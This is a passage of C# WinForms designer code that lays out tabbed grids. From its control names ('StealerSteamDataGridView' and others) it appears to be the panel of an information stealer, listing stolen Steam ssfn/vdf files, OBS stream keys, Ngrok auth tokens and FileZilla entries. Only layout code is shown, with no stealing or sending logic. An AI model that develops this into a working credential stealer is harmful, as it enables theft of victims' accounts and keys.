            this.dataGridViewTextBoxColumn12.HeaderText = "Files";
            this.dataGridViewTextBoxColumn12.Name = "dataGridViewTextBoxColumn12";
            this.dataGridViewTextBoxColumn12.ReadOnly = true;
            // 
            // SteamPage
            // 
            this.SteamPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.SteamPage.Controls.Add(this.StealerSteamDataGridView);
            this.SteamPage.ImageIndex = 19;
            this.SteamPage.Location = new System.Drawing.Point(139, 4);
            this.SteamPage.Name = "SteamPage";
            this.SteamPage.Size = new System.Drawing.Size(567, 207);
            this.SteamPage.TabIndex = 10;
            this.SteamPage.Text = "Steam";
            // 
            // StealerSteamDataGridView
            // 
            this.StealerSteamDataGridView.AllowUserToAddRows = false;
            this.StealerSteamDataGridView.AllowUserToDeleteRows = false;
            this.StealerSteamDataGridView.AllowUserToOrderColumns = true;
            this.StealerSteamDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle40.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle40.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle40.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle40.SelectionForeColor = System.Drawing.Color.White;
            this.StealerSteamDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle40;
            this.StealerSteamDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerSteamDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerSteamDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle41.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle41.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle41.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle41.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle41.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle41.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle41.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerSteamDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle41;
            this.StealerSteamDataGridView.ColumnHeadersHeight = 20;
            this.StealerSteamDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn41,
            this.dataGridViewTextBoxColumn44,
            this.dataGridViewTextBoxColumn45,
            this.dataGridViewTextBoxColumn46});
            dataGridViewCellStyle42.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle42.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle42.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle42.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle42.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle42.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle42.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerSteamDataGridView.DefaultCellStyle = dataGridViewCellStyle42;
            this.StealerSteamDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerSteamDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerSteamDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerSteamDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerSteamDataGridView.Name = "StealerSteamDataGridView";
            this.StealerSteamDataGridView.ReadOnly = true;
            this.StealerSteamDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerSteamDataGridView.RowHeadersVisible = false;
            this.StealerSteamDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerSteamDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerSteamDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerSteamDataGridView.TabIndex = 6;
            this.StealerSteamDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerSteamDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerSteamDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerSteamDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerSteamDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerSteamDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerSteamDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerSteamDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerSteamDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerSteamDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerSteamDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerSteamDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerSteamDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerSteamDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerSteamDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn41
            // 
            this.dataGridViewTextBoxColumn41.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn41.HeaderText = "Client";
            this.dataGridViewTextBoxColumn41.Name = "dataGridViewTextBoxColumn41";
            this.dataGridViewTextBoxColumn41.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn44
            // 
            this.dataGridViewTextBoxColumn44.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn44.HeaderText = "Games";
            this.dataGridViewTextBoxColumn44.Name = "dataGridViewTextBoxColumn44";
            this.dataGridViewTextBoxColumn44.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn45
            // 
            this.dataGridViewTextBoxColumn45.FillWeight = 11F;
            this.dataGridViewTextBoxColumn45.HeaderText = "ssnfFiles";
            this.dataGridViewTextBoxColumn45.Name = "dataGridViewTextBoxColumn45";
            this.dataGridViewTextBoxColumn45.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn46
            // 
            this.dataGridViewTextBoxColumn46.FillWeight = 6F;
            this.dataGridViewTextBoxColumn46.HeaderText = "vdfFiles";
            this.dataGridViewTextBoxColumn46.Name = "dataGridViewTextBoxColumn46";
            this.dataGridViewTextBoxColumn46.ReadOnly = true;
            // 
            // ObsPage
            // 
            this.ObsPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ObsPage.Controls.Add(this.StealerObsDataGridView);
            this.ObsPage.ImageIndex = 18;
            this.ObsPage.Location = new System.Drawing.Point(139, 4);
            this.ObsPage.Name = "ObsPage";
            this.ObsPage.Size = new System.Drawing.Size(567, 207);
            this.ObsPage.TabIndex = 11;
            this.ObsPage.Text = "OBS Keys";
            // 
            // StealerObsDataGridView
            // 
            this.StealerObsDataGridView.AllowUserToAddRows = false;
            this.StealerObsDataGridView.AllowUserToDeleteRows = false;
            this.StealerObsDataGridView.AllowUserToOrderColumns = true;
            this.StealerObsDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle43.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle43.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle43.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle43.SelectionForeColor = System.Drawing.Color.White;
            this.StealerObsDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle43;
            this.StealerObsDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerObsDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerObsDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle44.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle44.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle44.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle44.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle44.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle44.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle44.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerObsDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle44;
            this.StealerObsDataGridView.ColumnHeadersHeight = 20;
            this.StealerObsDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn50,
            this.dataGridViewTextBoxColumn51,
            this.dataGridViewTextBoxColumn52});
            dataGridViewCellStyle45.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle45.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle45.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle45.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle45.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle45.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle45.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerObsDataGridView.DefaultCellStyle = dataGridViewCellStyle45;
            this.StealerObsDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerObsDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerObsDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerObsDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerObsDataGridView.Name = "StealerObsDataGridView";
            this.StealerObsDataGridView.ReadOnly = true;
            this.StealerObsDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerObsDataGridView.RowHeadersVisible = false;
            this.StealerObsDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerObsDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerObsDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerObsDataGridView.TabIndex = 6;
            this.StealerObsDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerObsDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerObsDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerObsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerObsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerObsDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerObsDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerObsDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerObsDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerObsDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerObsDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerObsDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerObsDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerObsDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerObsDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn50
            // 
            this.dataGridViewTextBoxColumn50.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn50.HeaderText = "Client";
            this.dataGridViewTextBoxColumn50.Name = "dataGridViewTextBoxColumn50";
            this.dataGridViewTextBoxColumn50.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn51
            // 
            this.dataGridViewTextBoxColumn51.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn51.HeaderText = "Service";
            this.dataGridViewTextBoxColumn51.Name = "dataGridViewTextBoxColumn51";
            this.dataGridViewTextBoxColumn51.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn52
            // 
            this.dataGridViewTextBoxColumn52.FillWeight = 11F;
            this.dataGridViewTextBoxColumn52.HeaderText = "Stream Key";
            this.dataGridViewTextBoxColumn52.Name = "dataGridViewTextBoxColumn52";
            this.dataGridViewTextBoxColumn52.ReadOnly = true;
            // 
            // NgrokPage
            // 
            this.NgrokPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.NgrokPage.Controls.Add(this.StealerNgrokDataGridView);
            this.NgrokPage.ImageIndex = 17;
            this.NgrokPage.Location = new System.Drawing.Point(139, 4);
            this.NgrokPage.Name = "NgrokPage";
            this.NgrokPage.Size = new System.Drawing.Size(567, 207);
            this.NgrokPage.TabIndex = 12;
            this.NgrokPage.Text = "Ngrok Auths";
            // 
            // StealerNgrokDataGridView
            // 
            this.StealerNgrokDataGridView.AllowUserToAddRows = false;
            this.StealerNgrokDataGridView.AllowUserToDeleteRows = false;
            this.StealerNgrokDataGridView.AllowUserToOrderColumns = true;
            this.StealerNgrokDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle46.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle46.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle46.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle46.SelectionForeColor = System.Drawing.Color.White;
            this.StealerNgrokDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle46;
            this.StealerNgrokDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerNgrokDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerNgrokDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle47.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle47.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle47.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle47.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle47.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle47.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle47.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerNgrokDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle47;
            this.StealerNgrokDataGridView.ColumnHeadersHeight = 20;
            this.StealerNgrokDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn57,
            this.dataGridViewTextBoxColumn58});
            dataGridViewCellStyle48.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle48.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle48.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle48.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle48.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle48.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle48.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerNgrokDataGridView.DefaultCellStyle = dataGridViewCellStyle48;
            this.StealerNgrokDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerNgrokDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerNgrokDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerNgrokDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerNgrokDataGridView.Name = "StealerNgrokDataGridView";
            this.StealerNgrokDataGridView.ReadOnly = true;
            this.StealerNgrokDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerNgrokDataGridView.RowHeadersVisible = false;
            this.StealerNgrokDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerNgrokDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerNgrokDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerNgrokDataGridView.TabIndex = 6;
            this.StealerNgrokDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerNgrokDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerNgrokDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerNgrokDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerNgrokDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerNgrokDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerNgrokDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerNgrokDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerNgrokDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerNgrokDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerNgrokDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerNgrokDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerNgrokDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerNgrokDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerNgrokDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn57
            // 
            this.dataGridViewTextBoxColumn57.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn57.HeaderText = "Client";
            this.dataGridViewTextBoxColumn57.Name = "dataGridViewTextBoxColumn57";
            this.dataGridViewTextBoxColumn57.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn58
            // 
            this.dataGridViewTextBoxColumn58.FillWeight = 50F;
            this.dataGridViewTextBoxColumn58.HeaderText = "Auth Token";
            this.dataGridViewTextBoxColumn58.Name = "dataGridViewTextBoxColumn58";
            this.dataGridViewTextBoxColumn58.ReadOnly = true;
            // 
            // FilaZillaPage
            // 
            this.FilaZillaPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.FilaZillaPage.Controls.Add(this.StealerFilezillaDataGridView);
            this.FilaZillaPage.ImageIndex = 15;
            this.FilaZillaPage.Location = new System.Drawing.Point(139, 4);
            this.FilaZillaPage.Name = "FilaZillaPage";
            this.FilaZillaPage.Size = new System.Drawing.Size(567, 207);
            this.FilaZillaPage.TabIndex = 13;
            this.FilaZillaPage.Text = "FilaZilla";
            // 
            // StealerFilezillaDataGridView
            // 
            this.StealerFilezillaDataGridView.AllowUserToAddRows = false;
            this.StealerFilezillaDataGridView.AllowUserToDeleteRows = false;
            this.StealerFilezillaDataGridView.AllowUserToOrderColumns = true;
            this.StealerFilezillaDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle49.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle49.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle49.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle49.SelectionForeColor = System.Drawing.Color.White;
            this.StealerFilezillaDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle49;
            this.StealerFilezillaDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerFilezillaDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFilezillaDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle50.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle50.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle50.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle50.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle50.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle50.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle50.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerFilezillaDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle50;
            this.StealerFilezillaDataGridView.ColumnHeadersHeight = 20;
            this.StealerFilezillaDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn64,
            this.dataGridViewTextBoxColumn65,
            this.dataGridViewTextBoxColumn66,
            this.dataGridViewTextBoxColumn67,
            this.dataGridViewTextBoxColumn68});
            dataGridViewCellStyle51.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle51.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle51.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle51.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle51.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle51.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle51.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
